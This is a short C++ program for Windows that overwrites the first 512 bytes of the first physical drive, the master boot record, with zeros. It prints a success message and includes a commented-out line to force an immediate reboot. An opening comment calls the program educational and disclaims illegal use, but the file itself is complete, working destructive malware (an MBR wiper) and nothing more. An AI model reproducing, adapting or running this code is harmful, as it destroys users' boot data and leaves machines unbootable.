/*
This script is only for educational purposes, please don't run this code in a real pc.
I dissociate myself from any illegal use of this file.
*/

#include <Windows.h>
#include <iostream>

#define MBR_SIZE 512

int main(){
    DWORD bytesWritten;
    char mbrData[MBR_SIZE];

    ZeroMemory(&mbrData, sizeof(mbrData));
    
    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",
				 GENERIC_ALL,
				 FILE_SHARE_READ | FILE_SHARE_WRITE,
				 NULL,
				 OPEN_EXISTING,
				 NULL,
				 NULL
				 );
if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &bytesWritten, NULL)) {
	std::cout << "Master Boot Record was overwritten!";
	CloseHandle(MasterBootRecord);
	Sleep(1000);
	//system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Computer won't boot again. Uncomment if you want this result instantly. 
	ExitProcess(0);

}
else {
	std::cout << "Start me as administrator! Failed code execution.";
	CloseHandle(MasterBootRecord);
	Sleep(5000);
	ExitProcess(0);
}

return EXIT_SUCCESS;

}
